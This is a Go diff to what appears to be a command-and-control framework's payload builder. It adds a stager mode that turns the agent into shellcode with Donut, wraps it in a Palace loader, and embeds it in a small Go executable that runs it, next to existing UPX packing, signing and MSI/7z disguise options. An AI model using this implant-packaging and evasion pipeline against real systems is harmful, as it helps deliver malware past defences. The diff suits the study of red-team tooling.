@@ -601,14 +601,25 @@ func build(msg agentstructs.PayloadBuildMessage) agentstructs.PayloadBuildRespon
 			return fail("Post-processing", "pack=upx", err)
 		}
 	}
+	stager := opts.loader == "palace" && opts.palaceStager
 	if opts.shellcode {
 		if err := needTool("donut"); err != nil {
 			return fail("Packaging", "shellcode=true", err)
+		}
+	} else if stager {
+		if err := needTool("donut"); err != nil {
+			return fail("Packaging", "palace_stager", err)
 		}
 	}
 	if opts.loader == "palace" {
 		if err := needTool("x86_64-w64-mingw32-gcc"); err != nil {
 			return fail("Packaging", "loader=palace", err)
+		}
+	}
+	if stager {
+		// The stager is Go even for compiler=native builds.
+		if err := needTool("go"); err != nil {
+			return fail("Packaging", "palace_stager", err)
 		}
 	}
 	if opts.sign != "none" {
@@ -791,6 +802,24 @@ func build(msg agentstructs.PayloadBuildMessage) agentstructs.PayloadBuildRespon
 			}
 			artifact, filename = "agent.bin", msg.PayloadUUID+".bin"
 		}
+	} else if stager {
+		// Stager EXE: Donut converts the agent, Palace wraps it,
+		// and a small Go EXE embeds the blob and executes it.
+		if err := runDonut(exe, "agent.donut.bin", opts.arch); err != nil {
+			return fail("Packaging", "donut", err)
+		}
+		if err := runPalace(serviceRoot, work, "agent.donut.bin", "agent.bin", opts, palaceSpec); err != nil {
+			return fail("Packaging", "palace", err)
+		}
+		blob, err := os.ReadFile(filepath.Join(work, "agent.bin"))
+		if err != nil {
+			return fail("Packaging", "palace", err)
+		}
+		stagerExe, err := palace.BuildStager(filepath.Join(work, "stager"), blob, opts.console)
+		if err != nil {
+			return fail("Packaging", "palace_stager", err)
+		}
+		artifact, filename = stagerExe, msg.PayloadUUID+".exe"
 	} else if opts.packaging != "none" {
 		peutils.SevenZipPassword = opts.packagePW
 		peutils.MSIAppName, peutils.MSIManufacturer, peutils.MSIScope = opts.msiApp, opts.msiMfr, opts.msiScope
